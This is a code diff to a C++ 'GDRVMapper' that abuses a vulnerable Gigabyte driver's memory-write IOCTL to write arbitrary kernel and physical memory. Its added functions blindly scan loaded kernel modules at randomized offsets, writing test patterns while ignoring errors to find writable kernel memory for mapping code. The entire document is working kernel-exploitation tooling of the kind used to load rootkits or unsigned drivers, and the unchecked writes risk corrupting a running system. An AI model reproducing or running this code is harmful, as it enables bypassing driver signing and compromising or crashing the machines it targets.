@@ -71,7 +71,7 @@ bool GDRVMapper::ReadPhysicalMemory(uint64_t physAddress, void* buffer, size_t s
     );
 }
 
-bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, size_t size) {
+bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, size_t size, bool strictValidation) {
     if (hDevice == INVALID_HANDLE_VALUE) return false;
     
     // Try multiple times with different offsets if initial attempt fails
@@ -87,7 +87,7 @@ bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, s
         writeRequest.Buffer = (UINT64)buffer;
         
         DWORD bytesReturned = 0;
-        if (DeviceIoControl(
+        BOOL result = DeviceIoControl(
             hDevice,
             GDRV_IOCTL_WRITE_MEMORY,
             &writeRequest,
@@ -96,7 +96,47 @@ bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, s
             0,
             &bytesReturned,
             NULL
-        )) {
+        );
+        
+        if (!strictValidation) {
+            // Just attempt the write and return without checking for errors
+            return true;
+        }
+        
+        if (result) {
+            return true;
+        }
+    }
+    return false;
+}
+
+std::vector<uint64_t> GDRVMapper::GenerateRandomizedOffsets(uint64_t start, uint64_t end, uint64_t step) {
+    std::vector<uint64_t> offsets;
+    for (uint64_t offset = start; offset < end; offset += step) {
+        offsets.push_back(offset);
+    }
+    
+    // Use random device for true randomness
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::shuffle(offsets.begin(), offsets.end(), gen);
+    
+    return offsets;
+}
+
+bool GDRVMapper::IsModuleExcluded(const std::string& modulePath) {
+    // Skip critical system modules
+    const char* excludedModules[] = {
+        "ntoskrnl.exe",
+        "hal.dll",
+        "win32k.sys",
+        "ci.dll",
+        "clfs.sys",
+        "ksecdd.sys"
+    };
+    
+    for (const auto& excluded : excludedModules) {
+        if (modulePath.find(excluded) != std::string::npos) {
             return true;
         }
     }
@@ -161,19 +201,21 @@ uint64_t GDRVMapper::FindGDRVWritableMemory() {
     
     std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
     
-    // Try standard offsets first
+    // Try standard offsets first with non-strict validation
     for (auto offset : offsets) {
         uint64_t tryAddr = gdrvBase + offset;
         std::cout << "[*] Trying GDRV memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
         
-        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size())) {
+        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
             std::cout << "[+] Found writable memory in GDRV at 0x" << std::hex << tryAddr << std::dec << std::endl;
             return tryAddr;
         }
     }
     
-    // If standard offsets fail, try scanning in a loop
-    for (uint64_t offset = 0x1000; offset < 0x200000; offset += 0x1000) {
+    // If standard offsets fail, try scanning in a loop with randomization
+    auto randomOffsets = GenerateRandomizedOffsets(0x1000, MAX_SEARCH_RANGE, 0x1000);
+    
+    for (auto offset : randomOffsets) {
         // Skip offsets we already tried
         bool already_tried = false;
         for (auto standard_offset : offsets) {
@@ -190,7 +232,7 @@ uint64_t GDRVMapper::FindGDRVWritableMemory() {
             std::cout << "[*] Scanning GDRV memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
         }
         
-        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size())) {
+        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
             std::cout << "[+] Found writable memory in GDRV at 0x" << std::hex << tryAddr << std::dec << std::endl;
             return tryAddr;
         }
@@ -200,11 +242,70 @@ uint64_t GDRVMapper::FindGDRVWritableMemory() {
     return 0;
 }
 
+uint64_t GDRVMapper::FindModuleWritableMemory() {
+    std::cout << "[*] Searching for writable memory in kernel modules..." << std::endl;
+    
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return 0;
+    
+    typedef NTSTATUS(NTAPI* NtQuerySystemInformationFn)(
+        ULONG SystemInformationClass,
+        PVOID SystemInformation,
+        ULONG SystemInformationLength,
+        PULONG ReturnLength
+    );
+    
+    auto NtQuerySystemInformation = (NtQuerySystemInformationFn)GetProcAddress(
+        ntdll, "NtQuerySystemInformation");
+    if (!NtQuerySystemInformation) return 0;
+    
+    std::vector<uint8_t> buffer;
+    ULONG len = 0;
+    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
+    buffer.resize(len);
+    if (NtQuerySystemInformation(SystemModuleInformation, buffer.data(), len, &len) != 0)
+        return 0;
+
+    auto modules = (PSYSTEM_MODULE_INFORMATION)buffer.data();
+    std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
+    
+    // Try each module
+    for (ULONG i = 0; i < modules->Count; i++) {
+        std::string path = std::string(modules->Modules[i].FullPathName);
+        uint64_t moduleBase = (uint64_t)modules->Modules[i].ImageBase;
+        
+        // Skip excluded modules
+        if (IsModuleExcluded(path)) continue;
+        
+        std::cout << "[*] Trying module: " << path << std::endl;
+        
+        // Generate randomized offsets for this module
+        auto randomOffsets = GenerateRandomizedOffsets(0x1000, MAX_SEARCH_RANGE, 0x1000);
+        
+        for (auto offset : randomOffsets) {
+            uint64_t tryAddr = moduleBase + offset;
+            
+            // Only log every 64KB to reduce spam
+            if (offset % 0x10000 == 0) {
+                std::cout << "[*] Scanning address 0x" << std::hex << tryAddr << std::dec << std::endl;
+            }
+            
+            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
+                std::cout << "[+] Found writable memory in " << path << " at 0x" << std::hex << tryAddr << std::dec << std::endl;
+                return tryAddr;
+            }
+        }
+    }
+    
+    std::cerr << "[-] Could not find writable memory in any kernel module" << std::endl;
+    return 0;
+}
+
 uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
     // Check cached address first
     if (cachedWritableAddr != 0) {
         std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
-        if (WritePhysicalMemory(cachedWritableAddr, testPattern.data(), testPattern.size())) {
+        if (WritePhysicalMemory(cachedWritableAddr, testPattern.data(), testPattern.size(), false)) {
             std::cout << "[+] Using cached writable memory at 0x" << std::hex << cachedWritableAddr << std::dec << std::endl;
             return cachedWritableAddr;
         }
@@ -219,18 +320,27 @@ uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
             cachedWritableAddr = gdrvAddr;
             return gdrvAddr;
         }
+        
+        // If GDRV fails, try other kernel modules
+        uint64_t moduleAddr = FindModuleWritableMemory();
+        if (moduleAddr) {
+            cachedWritableAddr = moduleAddr;
+            return moduleAddr;
+        }
     }
 
-    // Only if GDRV fails or startAddr is specified, try other methods
+    // Only if all other methods fail or startAddr is specified, try direct memory search
     if (startAddr != 0) {
         std::cout << "[*] Trying fallback memory search at 0x" << std::hex << startAddr << std::dec << std::endl;
         
         std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
-        for (int i = 0; i < 8; i++) {
-            uint64_t tryAddr = startAddr + (i * 0x1000);
+        auto randomOffsets = GenerateRandomizedOffsets(0, 0x8000, 0x1000);
+        
+        for (auto offset : randomOffsets) {
+            uint64_t tryAddr = startAddr + offset;
             std::cout << "[*] Probing address 0x" << std::hex << tryAddr << std::dec << std::endl;
             
-            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size())) {
+            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
                 std::cout << "[+] Found writable memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
                 cachedWritableAddr = tryAddr;
                 return tryAddr;
